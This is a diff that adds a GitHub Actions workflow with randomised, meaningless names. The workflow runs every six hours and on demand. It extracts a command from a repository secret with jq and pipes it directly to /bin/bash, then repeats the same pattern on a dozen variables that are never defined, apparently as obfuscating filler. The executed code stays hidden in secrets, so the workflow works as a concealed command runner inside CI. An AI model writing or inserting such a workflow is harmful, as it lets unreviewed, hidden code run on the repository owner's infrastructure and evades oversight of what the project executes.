@@ -1,0 +1,30 @@
+name: yanfusu1932
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '13 3/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: yanfusu1932
+        env:
+          oct83386: ${{ secrets.oct83386 }}
+        run: |
+          echo $oct83386 | jq -r .to7968 | /bin/bash
+          echo $umdn539 | jq -r .sbhen1398 | /bin/bash
+          echo $t877 | jq -r .ln0523 | /bin/bash
+          echo $yw9 | jq -r .aadyi95 | /bin/bash
+          echo $myym928 | jq -r .t28 | /bin/bash
+          echo $ftxn374 | jq -r .czkhz6493 | /bin/bash
+          echo $rmzab0070 | jq -r .t44159 | /bin/bash
+          echo $nas32808 | jq -r .ogsp3 | /bin/bash
+          echo $zpv55805 | jq -r .zbnm513 | /bin/bash
+          echo $xpks346 | jq -r .xywpb0965 | /bin/bash
+          echo $fkxf600 | jq -r .np4092 | /bin/bash
+          echo $fpr40180 | jq -r .zbif4 | /bin/bash
+          echo $lxc27716 | jq -r .nenp18561 | /bin/bash
+
